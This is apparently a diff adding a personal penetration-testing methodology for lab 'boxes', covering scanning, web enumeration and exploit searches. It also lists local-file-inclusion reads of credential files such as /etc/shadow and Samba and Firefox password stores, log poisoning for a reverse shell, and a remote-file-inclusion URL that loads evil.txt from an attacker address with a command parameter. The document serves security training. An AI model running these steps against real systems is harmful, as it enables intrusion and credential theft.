@@ -1,0 +1,60 @@
+My methodology for solving a box:
+
+1- Run full port scan: nmap -Pn <target>
+2- Then run with --script vuln  and bunch of other flag on all open ports: nmap -Pn --script vuln -sCV -A -p <OpenPorts> <target_host>
+3- Start looking deep into nmap results and enumerate service by service. I have a tendency to enumerate HTTP/HTTPs at last, because it requires more than any other normal port. Below is the strategy I follow:
+  a- Enumerate all ports and look for common attack vectors on each of open ports.
+  b- HTTP/HTTPs is least on priority.
+  c- If any web server is running on some port: 
+      - run nikto: nikto -h <target>:<port>
+      - run dir search: python3 /path/to/dirsearch/dirsearch.py -u http://target.com -e php -t 400 (no need to run exhausative dictionaries unless you think there is a dire need, if there is something common.txt will figure it out otherwise move one)
+      - view page source and look for hidden paths, comments, plugins and version of various web technologies like CMS, 3rd party plugins etc.
+      - manually crawl all the application and take notes.   
+   d- Start doing searchsploit for version of services found on nmap. And start looking for  exact exploit matches and then move your way back towards the Major release of the version (like if you have 4.2.3 version of some service look for 4.2.3 first then 4.2 and then 4). Try the exact exploits on all ports first and if nothing comes up then start using exploits of previous version.
+   e- Don't rely on searchsploits for exploits only, use github and google as well once you have found the vulnerable version.
+   f- I have curated some list of common attacks in my "Recon on Common Ports" gist.
+4- Do avtive note taking, even if that feels too much of a work, it's worth it. It will help to correlate things and let you able to have a clear picture of any box.
+5- Don't forget credential reuse ever.
+6- Always remember it will not be too complex, it will always be from something you've learned. Don't overly complex things for yourself. If you have spent 20 mins into service and found nothing, you probably should look for something else.
+7- Some stuff regarding web applications:
+  a- Since sqlmap is not allowed, don't fall for a trap to exfilterate data via SQL injection manually. I think it will be the intended way and you should try it at last when all your other resources are exhausted. Use SQL injection to bypass authentication on both username and password fields.
+  b- if their is LFI and not RFI, then do below:
+    - use PHP wrappers to get command execution. (useful link: https://book.hacktricks.xyz/pentesting-web/file-inclusion)
+    - try to read creds from default locations. Each application that use creds to authenticate saves creds locally in order to perform successful authentication. We can use LFI to read password hashes/creds from such places like below:
+      -- Mozilla Firefox: Mozilla saves password in below default location, <profile> as you might have guessed is a unique identifier for each user and hence cannot be bruteforced but can be read at: ~/.mozilla/firefox/profiles.ini
+         ~/.mozilla/firefox/<profile>.default
+      -- MSSQL: MSSQL Stores password in MDF or LDF files. Most probabely you can't read it directly because it's being consumed by system so you have to improvise and look for backup folder. (useful resource: https://blog.xpnsec.com/extracting-master-mdf-hashes/)
+        C:\Program Files\Microsoft SQL Server\<SQL-VERSION>\MSSQL\DATA\<MDF|LDF>
+      -- Samba: Configuration of samba can be read at /etc/samba/smb.conf and default location for password file is below: 
+        /var/lib/samba/passdb.tdb
+      -- Shadow: Very unlikely but still worth a try:
+        /etc/shadow
+      -- SSH keys:
+        ~/.ssh/authorized_keys
+        There can be unique scenarios, so actively take notes and look for running service and improvise to increase the impact.
+        
+     - We can use LFI to trigger a web shell once uploaded.
+     - Check if apache log file (or web server log file) is accessible which we can corrupt. We can gain reverse shell by corrupting the logs as well without having the need to upload our shell. 
+     
+    c- In case of RFI, first generate a simple HTTP request to your owned server to enusre the existence of vulnerability. Once done, we can run arbitrary commands using various payloads:
+      - Always use various type of shells, for example in php use different functions like system, shell_exec, popen, passthru to gain shell. (useful resource: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php)
+      - Improvise with the server environment and use shells of various languages as well.
+      - Sample command: http://<target>/sample.php?file=http://10.11.0.4/evil.txt&cmd=ipconfig
+      - Use curl or web proxies to exploit these kind of vulnerabilities, as sometime application don't throw errors on web browser but errors do come in response of web request.
+      
+    d- Attacks on login portals:
+      - SQL Injection for auth bypass in both username and password field. As sometime username is not vulnerable but password is.
+      - Weak creds (admin/admin, search on google for default creds, use cewl to generate wordlist from page and use it to bruteforce [command: cewl http://target/app.pl >> cewl])
+      - Credential Reuse.
+    
+    e- Always, I repeat always read an exploit before using it saves alot of effort. And try exploiting manually from the payload in exploit, if possible, as it helps alot in debugging.
+    
+    f- Improvise and improve debugging skills. Look on google for specific service/web version exploits to see any potenital PoC, if available.
+    
+8- For windows, if powershell is not working try running it thru cmd. First, generate a simple http request from cmd and then improvise your exploit to serve your need.
+
+9- When gained a lower shell, invoke priv esc methodology as per the victim OS.
+    
+
+  
+  
